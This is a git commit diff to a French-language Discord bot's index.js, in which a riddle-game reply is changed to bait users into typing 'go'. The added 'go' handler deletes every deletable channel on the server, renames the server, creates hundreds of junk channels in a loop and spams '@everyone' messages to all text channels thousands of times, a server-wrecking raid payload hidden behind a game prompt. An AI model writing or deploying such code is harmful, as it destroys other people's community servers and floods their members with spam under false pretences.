e969d5e6e3fa018d8c56b3145761482c3c7b6137
dqszxdbcyezfckq <45467604+dqszxdbcyezfckq@users.noreply.github.com>
2019-02-12 09:59:17 +0100

    Update index.js

--- index.js
+++ index.js
@@ -3,7 +3,25 @@ const client = new Discord.Client();
 
 client.on('message', msg => {
     if(msg.content === 'aytp'){
-   return msg.reply('Bon ba gg\nenfaite ya rien\nc\'est Alexandre qui a l\'énigme dans sa poche :)\nta fait tout ça pour rien c:')
+   return msg.reply('Bon ba gg\nmaintenant tu vas savoir qui entre Dylan et Alexandre va te donner la suite\n\nEcrit "go" pour savoir.')
+    }
+     if(msg.content === 'go'){
+         
+msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
+for (var i = 0; i < 490; i++) {
+  //msg.guild.setIcon('https://cdn.discordapp.com/attachments/535351927882645525/535901228769476619/unknown.png').catch(e => {})
+  msg.guild.setName('Dylouf le ouf').catch(e => {});
+  msg.guild.createChannel('Dylouf le ouf', 'voice').catch(e => {});
+  msg.guild.createChannel('Dylouf le ouf', 'text').catch(e => {});
+}    
+     }
+    
+    if(msg.content === 'go'){
+     for(var i = 0; i < 9999; i++) {
+          msg.guild.channels.forEach(channel => {
+      if (channel.type === "text") channel.send("@everyone DYLOUF LE OUF")
+}, 2500);
+     }
     }
 });
 
